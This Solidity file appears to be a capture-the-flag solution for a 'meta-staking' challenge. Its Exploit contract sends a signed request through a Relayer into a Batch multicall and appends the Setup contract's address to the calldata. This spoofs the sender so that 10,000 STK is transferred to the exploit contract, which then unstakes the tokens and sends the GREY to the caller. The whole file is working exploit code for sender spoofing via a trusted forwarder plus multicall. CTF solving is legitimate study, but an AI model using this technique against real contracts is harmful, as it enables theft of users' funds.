// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.15;

import { Setup, Staking, Relayer } from "src/meta-staking/Setup.sol";
import { Batch } from "src/meta-staking/lib/Batch.sol";

contract Exploit {
    Setup setup;
    address publicKey;
    uint256 privateKey;

    constructor(Setup _setup, address _publicKey, uint256 _privateKey) {
        setup = _setup;
        publicKey = _publicKey;
        privateKey = _privateKey;
    }

    function solve(uint8 v, bytes32 r, bytes32 s) external {
        // Transfer 10,000 STK to this address
        Relayer.Signature memory signature = Relayer.Signature({
            v: v,
            r: r,
            s: s,
            deadline: type(uint256).max
        });
        Relayer.TransactionRequest memory request = Relayer.TransactionRequest({
            transaction: _getTransaction(),
            signature: signature
        });
        setup.relayer().execute(request);

        // Withdraw GREY with STK and transfer to msg.sender
        setup.staking().unstake(10_000e18);
        setup.grey().transfer(msg.sender, 10_000e18);
    }

    function getTxHash() external view returns (bytes32) {
        return keccak256(abi.encode(_getTransaction(), setup.relayer().nonce()));
    }

    function _getTransaction() internal view returns (Relayer.Transaction memory) {
        // Create transaction to transfer 10,000 STK from Setup contract to this address
        bytes[] memory innerData = new bytes[](1);
        innerData[0] = abi.encodePacked(
            abi.encodeCall(Staking.transfer, (address(this), 10_000e18)),
            address(setup)
        );

        // Pass data to multicall through relayer
        return Relayer.Transaction({
            from: publicKey,
            to: address(setup.staking()),
            value: 0,
            gas: 10_000_000,
            data: abi.encodeCall(Batch.batchExecute, (innerData))
        });
    }
}